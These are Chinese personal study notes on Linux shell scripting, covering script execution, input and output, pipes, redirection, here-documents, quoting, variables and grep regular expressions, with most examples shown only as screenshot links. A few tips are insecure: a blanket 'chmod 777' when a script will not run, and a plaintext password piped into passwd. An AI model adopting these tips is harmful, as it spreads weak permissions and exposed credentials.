<font color='yellow'>熟练的 使用 shell 编程。</font>

<font color='red'>author: cdxiaodong </font>

<font color='red'>作者: cdxiaodong </font>

<font color='red'>请配合上面的scripts文件夹食用 如果需要shell脚本的可以联系我。 </font>

<font color='red'>无偿制作有趣的，关于网络安全的脚本</font>

学习shell编程

参考：

《跟老男孩学Linux运维:Shell编程实战》

《Linux Shell核心编程实战》





目录:

[TOC]



## 1开始起飞

### 1.1脚本执行方式

1.sh文件权限  这个就不讲了

bash 和sh 可以直接执行   不行这样的话直接chmod 777

2.开启子进程执行的方式

关于是否开启子进程，我们首先要了解什么是子进程，一般可以通过pstree命令来查看进程树，了解进程之间的关系。

![image-20220313191613016](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313191613016.png)

![image-20220313191704385](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313191704385.png)

![image-20220313191749999](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313191749999.png)

通过以上输出，我们可以看到计算机启动的第一个进程是systemd，然后在这个进程下启动了N个子进程，如NetworkManager、atd、chronyd、sshd这些都是systemd的子进程。而在sshd进程下又有2个sshd的子进程，在2个sshd子进程下又开启了bash解释器子进程，而且在其中一个bash进程下面还执行了一条pstree命令。对于刚才我们说的不管是直接执行脚本，还是使用bash或sh这样的解释器执行脚本，都是会开启子进程的。

下面通过一个脚本文件演示效果

首先，打开一个命令终端，在该命令终端中编写脚本文件，并执行脚本文件。![image-20220313192751767](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192751767.png)

然后，开启一个命令终端，在这个终端中通过pstree命令观察进程树。

![image-20220313192819644](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192819644.png)

通过输出可以看到，在bash终端下开启了一个子进程脚本文件，通过脚本文件执行了一条sleep命令。

回到第一个终端，使用Ctrl+C组合键终止前面执行的脚本文件，使用bash命令再次执行该脚本。

![image-20220313192840244](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192840244.png)

最后，在第二个终端上使用pstree命令观察实验结果。

![image-20220313192857347](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192857347.png)

结果类似，在bash进程下开启了一个bash子进程，在bash子进程下执行了一条sleep命令。

3.不开启子进程的执行方式

下面我们来看看不开启子进程的执行方式的案例，与之前的实验类似，我们需要开启两个命令终端。

首先，打开第一个终端，这次使用source或．（点）命令来执行脚本文件。

![image-20220313192931952](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192931952.png)

或者

![image-20220313193114008](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193114008.png)

然后，我们再打开第二个终端，通过pstree命令观察结果。

![image-20220313193135636](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193135636.png)

通过实验结果可以看到，脚本文件中的sleep命令是直接在bash终端下执行的。最后，我们编写一个特殊的脚本文件，内容如下。

![image-20220313193157898](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313193157898.png)

![image-20220313193341466](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193341466.png)

你可能已经发现了，source命令不开启子进程执行脚本文件会导致整个终端被关闭

![image-20220313193422083](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193422083.png)

这是因为 source exit.sh的话是不开启子进程来运行的，也就是在此命令窗里面运行，

所以直接执行的exit   导致命令窗口退出。

### 1.2如何在脚本文件中实现输入于输出

1.使用echo命令创建一个脚本文件菜单

![image-20220313194617657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194617657.png)

![image-20220313194607498](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194607498.png)

![image-20220313194719261](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194719261.png)

![image-20220313194839082](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194839082.png)

![image-20220313195349039](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195349039.png)

输出hello，换行但光标仍旧停留在原来的位置，也就是字母o后面的这个位置，然后输出world。

![image-20220313195454767](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195454767.png)

\r会让光标返回行首

![image-20220313195748157](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195748157.png)

加粗显示OK, \033或\e后面跟不同的代码可以设置不同的终端属性，1m是让终端粗体显示字符串，后面的OK就是需要显示的字符串内容，最后\033[0m是在加粗输出OK后，关闭终端的属性设置。如果最后没有使用0m关闭属性设置，则之后终端中所有的字符串都使用粗体显示。执行下面这条命令后，会发现除了OK加粗显示，后面在终端中输出的所有字符串都加粗显示。

![image-20220313195850701](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195850701.png)

![image-20220313195928309](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195928309.png)

除了可以定义终端的字体颜色、样式、背景，还可以使用H定义位置属性。例如，可以通过下面的命令在屏幕的第3行、第10列显示OK。

![image-20220313200236757](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200236757.png)

![image-20220313200300321](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200300321.png)

在看透第三行显示ok

最后，我们使用echo命令编写一个更有趣的脚本文件菜单！下面这个脚本文件，首先使用clear命令将整个屏幕清空，然后使用echo命令设置终端属性，打印了一个有颜色、有排版的个性化菜单。至于具体的颜色搭配，各位读者可以根据自己的需求进行个性化设计。![image-20220313200539215](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200539215.png)

2.扩展知识，使用printf命令创建一个脚本菜单Linux系统中除了echo命令可以输出信息，还可以使用printf命令实现相同的效果。

功能描述：printf命令可以格式化输出数据。

printf命令的语法格式如下。

![image-20220313200753058](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200753058.png)

![image-20220313200710349](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200710349.png)

应用案例

![image-20220313200937613](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200937613.png)

![image-20220313201155666](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201155666.png)

左对齐输出12，输出的内容占用10个字符宽度，12占用2个字符宽度，后面跟了8个空格位置。默认printf命令输出内容后不会换行，使用\n命令符可以在输出内容后换行。

![image-20220313201300793](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201300793.png)

类似于echo、

![image-20220313201826546](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201826546.png)

只不过利用编程语言的特性 将45465用%secho进去

3.使用read命令读取用户的输入信息

前面我们学习了在Shell脚本中实现输出数据的方法，接下来探讨如何解决输入的问题，在Shell脚本中允许使用read命令实现数据的输入功能。

功能描述：read命令可以从标准输入读取一行数据。

read命令的语法格式如下。

![image-20220313202025835](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202025835.png)

如果未指定变量名，则默认变量名称为REPLY。read命令常用的选项如下所示。

![image-20220313202055675](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202055675.png)

从标准输入中读取数据，这里通过键盘输入了123, read命令则从标准输入读取这个123，并将该字符串赋值给变量key1，对于key1这个变量，我们可以使用echo$key1显示该变量的值。

应用案例：

![image-20220313202258447](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202258447.png)

![image-20220313202644939](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202644939.png)

![image-20220313202934814](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202934814.png)

注意，这里提示输入密码后，当用户输入密码123时，计算机将密码的明文显示在屏幕上，这不是我们想看到的效果！怎么办？read命令支持-s选项，这个选项可以让用户输入的任何数据都不显示，但read命令依然可以读取用户输入的数据，只是数据不显示而已。

![image-20220313203503201](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313203503201.png)

这个脚本通过read命令读取用户输入的用户名和密码，并且在读取用户输入的密码时，不直接在屏幕上显示密码的内容，这样更安全。用户输入的用户名和密码分别保存在user和pass这两个变量中，下面就通过$调用变量中的值，使用useradd命令创建一个系统账户，使用passwd命令给用户配置密码。直接使用passwd修改密码默认采用人机交互的方式配置密码，需要人为手动输入密码，并且要重复输入两次。这里我们使用了一个|符号，这个符号就像管道，它的作用是将前一个命令的输出结果，通过管道传给后一个命令，作为后一个命令的输入。

有时候，在Linux系统中我们需要完成一个复杂的任务，但是某一个命令可能无法完成这个任务，此时，我们就需要使用管道把两个或多个命令组合在一起来完成这样的任务。

如图下所示，类似于传输水的管道，Linux系统的管道，可以将命令1的输出结果（数据），存储到管道中，然后让命令2从管道中读取数据，并对数据做进一步的处理。

![image-20220313203904564](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313203904564.png)

下面我们看几个管道的案例。

![image-20220313204046088](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313204046088.png)

who这条命令，可以帮助我们查看有哪些账户在什么时间登录了计算机。但是，当计算机的登录信息非常多时，需要人为记录登录的数量就很不方便，而Linux系统中的wc命令可以统计行数，但wc命令是需要数据的，给wc若干行数据，这个命令就可以自动统计数据的行数。我们可以使用管道将who和wc命令结合在一起使用。

![image-20220313205228777](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313205228777.png)

ss命令可以查看Linux系统中所有服务监听的端口列表。但是ss命令自身没有灵活的过滤功能，而grep命令有比较强大灵活的过滤功能，这样的话也可以通过管道将这两个命令结合在一起使用。

![image-20220313205458970](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313205458970.png)

配合grep使用

再比如，ss命令可以查看Linux系统中所有服务监听的端口列表。但是ss命令自身没有灵活的过滤功能，而grep命令有比较强大灵活的过滤功能，这样的话也可以通过管道将这两个命令结合在一起使用。

![image-20220313212623418](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313212623418.png)

很明显，没有使用grep命令过滤的数据量比较多，看起来不够清晰，而ss命令把自己输出的数据存入管道后，grep命令再从管道中读取数据，在众多数据中过滤出包含sshd的数据行，最后输出结果就只有两行数据。这样能比较简单明了地看到我们需要的数据。

很明显，没有使用grep命令过滤的数据量比较多，看起来不够清晰，而ss命令把自己输出的数据存入管道后，grep命令再从管道中读取数据，在众多数据中过滤出包含sshd的数据行，最后输出结果就只有两行数据。这样能比较简单明了地看到我们需要的数据。

![image-20220313213042711](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313213042711.png)

echo命令默认会把输出结果显示在屏幕上，而有了管道后，echo命令可以把输出的123456存储到管道中，passwd再从管道中读取123456，来修改系统账户jacob的密码。

![image-20220313213057650](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313213057650.png)



### 1.3输入与输出的重定向

这个反弹shell学习的时候有相关接触过

在大多数系统中，一般会默认把输出信息显示在屏幕上，而标准的输入信息则通过键盘获取。但在编写脚本时，当有些命令的输出信息我们不能或不希望显示在屏幕上（脚本执行时，大量的输出信息反而会让用户感到迷茫）。此时，不如先把输出的信息暂时写入文件中，后期需要时，再读取文件，提取需要的信息。对于默认的标准输入信息也会有类似的问题，在Linux系统中当我们使用mail命令发送邮件时，程序需要读取邮件的正文，默认通过读取键盘的输入数据作为正文，这样会让脚本进入交互模式，因为读取键盘信息是需要人为手动输入的。此时，如果能改变默认的输入方式，不再从键盘读取数据，而是从提前准备好的文件中读取数据，就可以让mail程序在需要时自动读取文件内容，自动发送邮件，而不需要人为的手动交互。这样脚本的自动化效果会更好。

在Linux系统中输出可以分为标准输出和标准错误输出。标准输出的文件描述符为1，标准错误输出的文件描述符为2。而标准输入的文件描述符则为0。

如果希望改变输出信息的方向，可以使用＞或＞＞符号将输出信息重定向到文件中。使用1＞或1＞＞可以将标准输出信息重定向到文件（1可以忽略不写，默认值就是1），也可以使用2＞或2＞＞将错误的输出信息重定向到文件。这里使用＞符号将输出信息重定向到文件，如果文件不存在，则系统会自动创建该文件，如果文件已经存在，则系统会将该文件的所有内容覆盖（原有数据会丢失！）。而使用＞＞符号将输出信息重定向到文件，如果文件不存在，则系统会自动创建该文件，如果文件已经存在，则系统会将输出的信息追加到该文件原有信息的末尾。

下面的例子中，echo命令本来会将数据输出显示在屏幕上，但如果使用重定向后就可以将输出的信息导出到文件中。

如果一条命令既有标准输出（正确输出），又有错误输出，该如何重定向呢？

![image-20220313215530406](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215530406.png)

只重定向标准输出   不重定向错误输出

![image-20220313215648038](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215648038.png)

只重定向错误输出  不重定向标准输出

其实，我们可以将标准输出和错误输出分别重定向到不同的文件，也可以同时将它们重定向到相同的文件。

![image-20220313215903714](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215903714.png)

使用&＞符号可以同时将标准输出和错误输出都重定向到一个文件（覆盖），也可以使用&＞＞符号实现追加重定向。

![image-20220313220006412](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220006412.png)

最后，我们还可以使用2＞&1将错误输出重定向到标准正确输出，也可以使用1＞&2将标准正确输出重定向到错误输出。

下面的命令虽然都在屏幕上显示了结果。第一条命令虽然是报错信息，却是从标准正确的通道显示在屏幕上的。而第二条命令虽然原本没有错误信息，但通过将正确信息重定向到错误输出，最后的hello是通过错误输出的通道显示在屏幕上的。

![image-20220313220138202](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220138202.png)

是ls命令对比。正常情况下，因为系统没有/nofile文件，所以ls命令会报错，报错信息会通过错误输出的通道传递给显示器。但当我们使用2＞&1命令时，就会把错误信息重定向到标准正确输出，虽然屏幕最终也会显示报错信息，却是通过标准输出通道传递给显示器的。

![image-20220313220417867](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220417867.png)

![image-20220313220707497](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220707497.png)

正常情况下，echo命令会通过标准输出将消息显示在屏幕上。而当我们使用1＞&2时，系统就会把正确的输出信息重定向到错误输出，虽然屏幕上最终也显示了hello，却是通过错误输出通道传递给显示器的。

![image-20220313220618790](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220618790.png)

结合这种特殊的重定向方式，我们还可以将标准输出重定向到文件，然后将错误输出重定向到标准正确输出。最终把正确的和错误的信息都导入文件中，如下所示。

![image-20220313220909503](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220909503.png)

Linux系统中有一个特殊的设备/dev/null，这是一个黑洞。无论往该文件中写入多少数据，都会被系统吞噬、丢弃。如果有些输出信息是我们不再需要的，则可以使用重定向将输出信息导入该设备文件中。注意：数据一旦导入黑洞将无法找回。

![image-20220314164024610](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314164024610.png)

除了可以对输出进行重定向，还可以对输入进行重定向。默认标准输入为键盘鼠标。但键盘需要人为的交互才可以完成输入。比如下面的mail命令，执行完命令后程序就会进入等待用户输入邮件内容的状态，只要用户不输入内容，并使用独立的一行点表示邮件内容结束，mail程序就会一直停留在该状态。

![image-20220314164547426](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314164547426.png)

以上所有邮件正文都需要人工手动输入，而未来当我们需要使用脚本自动发送邮件时，这就存在问题。为了解决这个问题，我们可以使用＜符号进行输入重定向。＜符号后面需要跟一个文件名，这样可以让程序不再从键盘读取输入数据，而从文件中读取数据。

![image-20220314165421925](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314165421925.png)

如果我们希望自动非交互地发送邮件，而又没有提前准备文件，可以吗？

可以使用＜＜符号实现相同的效果。这样脚本就不需要依赖邮件内容的文件即可独立运行。使用＜＜符号可以将数据内容重定向传递给前面的一个命令，作为命令的输入。

![image-20220314170332033](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314170332033.png)

＜＜符号（也被称为Here Document）代表你需要的内容在这里。下面看一个cat通过Here Document读取数据，再通过输出重定向将数据导出到文件的例子。![image-20220314170848665](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314170848665.png)

在Linux系统中经常会使用fdisk命令对磁盘进行分区，但该命令是交互式的，而我们现在需要编写脚本实现自动分区、自动格式化、自动挂载分区等操作。针对这种问题，也可以通过HereDocument来解决。下面我们来编写一个这样的自动分区脚本。

![image-20220314172609072](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220314172609072.png)

![image-20220314172617760](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314172617760.png)

分析一下里面的各个指令:

```
/etc/fstab :
   磁盘被手动[挂载]之后都必须把挂载信息写入/etc/fstab这个文件中，否则下次开机启动时仍然需要重新挂载。
	系统开机时会主动读取/etc/fstab这个文件中的内容，根据文件里面的配置挂载磁盘。这样我们只需要将磁盘的挂载信息写入这个文件中我们就不需要每次开机启动之后手动进行挂载了。
```

```
[ ! -d /data ] 
不能存在这个目录
```

EOF配合cat支持多行字符输出

在编写脚本时为了提高代码的可读性，往往需要在代码中添加额外的缩进。然而，使用＜＜将数据导入程序时，如果内容里面有缩进，则连同缩进的内容都会传递给程序。而此时的Tab键仅仅起缩进的作用，我们并不希望传递给程序。如果需要，可以使用＜＜-符号重定向输入的方式实现，这样系统会忽略掉所有数据内容及分隔符（EOF）前面的Tab键。使用这种方式仅可以忽略Tab键，如果Here Document的正文内容有空格缩进，则无效。

![image-20220314212243567](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220314212243567.png)

![image-20220314212309939](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212309939.png)

总结： 2是错误1是对 &在>前是输入   &在>后是输出

### 1.4各种引号的正确使用

#### 1)单引号与双引号

在编写脚本时我们经常需要用到引号，而Shell支持多种引号，如""（双引号）、''（单引号）、``（反引号）、\（转义符号）。这么多的符号，都是在什么情况下使用的呢？下面我们看几个案例。

![image-20220314212841791](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212841791.png)

创建a b c三个文件

![image-20220314212921340](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212921340.png)

创建一个名为a b c的文件

这里可以看出双引号的作用是引用一个整体，计算机会把引号中的所有内容当作一个整体看待。而不使用双引号时，创建的是三个不同的文件。当后期需要删除文件时，也会出现类似的问题。

![image-20220314213018127](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213018127.png)

这样的输出结果很容易让人误解，这里到底有几个文件？文件名到底是什么？

![image-20220314213046950](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213046950.png)

![image-20220314213101966](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213101966.png)

因为这里没有使用双引号，所以系统理解的是需要删除a、b和c这三个文件，但其实现在系统中没有这三个文件，而只有一个文件，名称为“a b c”，其中空格也是文件名的一部分，这个文件应怎么删除呢？

![image-20220314213129170](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213129170.png)

通过使用双引号，成功删除了这个文件。在Linux系统中，除了可以使用双引号引用一个整体，还可以使用单引号引用一个整体，同时单引号还有另外一个功能，即可以屏蔽特殊符号（将特殊符号的特殊含义屏蔽，转化为字符表面的名义）![image-20220314213224038](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213224038.png)

上面两条命令因为没有特殊符号，所以使用双引号或单引号的作用是一样的。但是，当有特殊符号时，单引号和双引号不能互换，比如下面的例子。

![image-20220314213313340](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213313340.png)

在Shell中，#符号有特殊含义，是注释符号。#符号及#符号后面的内容都会被程序理解为注释，而不会被执行，这条命令本来想通过屏幕输出一个#符号，但实际的输出结果却是空白行。如果我们希望输出这个#号，则可以使用单引号，将#符号的特殊含义屏蔽掉。

![image-20220314213342957](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213342957.png)

另外，在Shell中$符号有提取变量值的特殊含义，而当我们需要直接使用$这个符号时，也需要使用单引号的屏蔽功能。

![image-20220314213445419](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213445419.png)

其实，在Linux中具有屏蔽功能的除单引号外，还有\符号，虽然\符号也可以实现屏蔽转义的功能，但\符号仅可以转义其后面的第一个符号，而单引号可以屏蔽引号内所有的特殊符号

#### 2）命令替换

最后，我们来了解``符号（反引号），反引号是一个命令替换符号，它可以使用命令的输出结果替代命令，下面我们看一个例子。

![image-20220314213719310](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213719310.png)

使用上面这条命令可以把/var/log目录下的所有数据备份到/root目录下，但是备份的文件名是固定的。如果需要系统执行计划任务，实现在每周星期五备份一次数据，然后新的备份就会把原有的备份文件覆盖（因为文件名是固定的）。到最后发现其实仅备份了最后一周的数据，前面的所有数据全部丢失！怎么解决这个问题呢？

![image-20220314213854150](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213854150.png)

这条命令依然使用tar命令进行备份。但是，因为使用了``符号实现命令替换，所以这里备份的文件名不再是date，而是date命令执行后的输出结果，即使用命令的输出结果替换date命令本身的字符串，最后备份的文件名类似log-20180725.tar.gz。文件名中具体的时间根据执行命令时的计算机系统时间而定。再看几个例子。

![image-20220314214738781](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214738781.png)

![image-20220314214456395](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD%5Cimage-20220314214456395.png)

反引号虽然很好用，但也有其自身的缺陷，比如容易跟单引号混淆，不支持嵌套（反引号中再使用反引号），为了解决这些问题，人们又设计了$（）组合符号，功能也是命令替换，而且支持嵌套功能，如下面的这些案例所示。

![image-20220314214702268](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214702268.png)

![image-20220314215015316](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215015316.png)

![image-20220314215207572](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215207572.png)

![image-20220314215346711](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215346711.png)

$与（中间不要有空格哦，不然会这样

![image-20220314214834481](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214834481.png)



### 1.5变量

变量名示例

![image-20220314215531896](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215531896.png)

其次，当需要读取变量值时，需要在变量名前添加一个美元符号“$”；而当变量名与其他非变量名的字符混在一起时，需要使用{}分隔。

最后，如果需要取消变量的定义，则可以使用unset命令删除变量。

![image-20220314220229893](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314220229893.png)

![image-20220314215842919](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215842919.png)

上面这条命令的返回值为空，因为没有定义一个名称是hello的变量，而且实际需要输出的应该是123hello。此时就需要使用{}分隔变量名和其他字符。

![image-20220314220301063](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314220301063.png)

虽然这三条命令都没有使用{}分隔变量名与其他字符，但最后返回值也不为空白，因为Shell变量名称仅可以由字母、数字、下画线组成，不可能包括特殊符号（如横线、冒号、空格等），所以系统不会把特殊符号当作变量名的一部分，系统会理解变量名为test，后面是其他跟变量名无关的字符串。下面我们看一个简单的使用变量的案例。

![image-20220314222020948](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222020948.png)

![image-20220314222157817](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222157817.png)

```
分析一下命令
netmask 子网掩码
tr -s 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串
cut -d" " -f3以空格为切割符 -f表示第几列 这里取第三列
free 显示系统内存使用情况
mem （内存）存储器 记忆装置
```

这个脚本中定义了三个变量，三个变量值都是命令的返回结果，因此每次执行脚本时变量值都有可能发生变化。但是，不管变量值怎么变化，脚本都可以在最后正常地输出这些变量值

![image-20220314222254199](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222254199.png)

将多个a合并为一个a

![image-20220314222354409](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222354409.png)

以空格为分隔符 获取第二列

![image-20220314222427070](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222427070.png)

以-为分隔符 获取第三列

上面介绍的是用户自定义变量，接下来了解系统预设变量。系统预设变量，顾名思义就是系统已经预先设置好的变量，不需要用户自己定义便可以直接使用的变量。系统预设变量基本都是以大写字母或使用部分特殊符号为变量名[插图]。表1-5中列举了系统中常见的系统预设变量。

![image-20220314222607123](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222607123.png)

系统预设变量可以细分为：环境变量、位置变量、预定义变量、自定义变量。在实际编写脚本时能够在合适的地方应用合适的变量即可，这里不再细化讲解。

编写脚本案例并调用这些系统预设变量，查看执行效果。

![image-20220314223130212](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223130212.png)

![image-20220314223515901](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223515901.png)

因为“$*”将所有参数视为一个整体，因此创建了一个名称为“AC 8 D”的文件，空格也是文件名的一部分。而“$@”将所有参数视为独立的个体，因为touch名称创建了4个文件，分别是A、C、8、D，使用ls -l命令可以查看得更清楚。

![image-20220314223354120](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223354120.png)

$? ”返回上一条命令的退出状态代码，脚本中先执行ls/etc/passwd，当这个命令被正确地执行后，“$0”返回的结果为0。而当执行ls /etc/pass命令时，因为pass文件不存在，所以该命令报错无法找到该文件。此时，“$? ”返回的退出状态码为2（正确为0，错误为非0，但根据错误的情况不同，每个程序返回的具体数字也会有所不同）。

### 1.6数据过滤与正则表达式

#### grep

![image-20220314223649519](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223649519.png)

![image-20220314223808197](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223808197.png)

在test.txt文件中过滤包含th关键词的行

![image-20220314223855449](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223855449.png)

在txt文件中查找包含java的行

![image-20220314224012268](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224012268.png)

#### 正则表达式

这个东西不是看一遍就会了

我之前也为此看了一整本书 但是还是不会 

实战利用才是解决记忆的方法

![image-20220314224148762](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224148762.png)

![image-20220314224409155](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224409155.png)

匹配含有root的行

![image-20220314224507343](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224507343.png)

查找与“0:”之间包含任意两个字符的字符串，并且显示改行

![image-20220314224612649](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224612649.png)

查找至少一个0的行 （第一个必须出现 第二个可以出现0或多次）

![image-20220314224827507](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD\image-20220314224827507.png)

查找含有oot或者ost的行

![image-20220314224938364](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224938364.png)

查找包含四个字符按照上述排列的行

![image-20220314225100504](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225100504.png)

查找以root开头的行

![image-20220314225121264](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225121264.png)

查找以bash结尾的行

![image-20220314225225379](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225225379.png)

查找bin后面不跟n的行

![image-20220314225429259](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225429259.png)

查找0最少一次最多两次的行

![image-20220315160340990](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160340990.png)

grep "\(script\).*\1" 1.txt

查找两个root之间可以是任意字符的行。注意：这里用\ (root\）

将root保留、后面\1再次调用root，相当与前面复制root 后面粘贴root

![image-20220315160657044](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160657044.png)

![image-20220315160747320](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160747320.png)

自动去掉文件空白行  注意记得在$前添加\ 不然无法执行

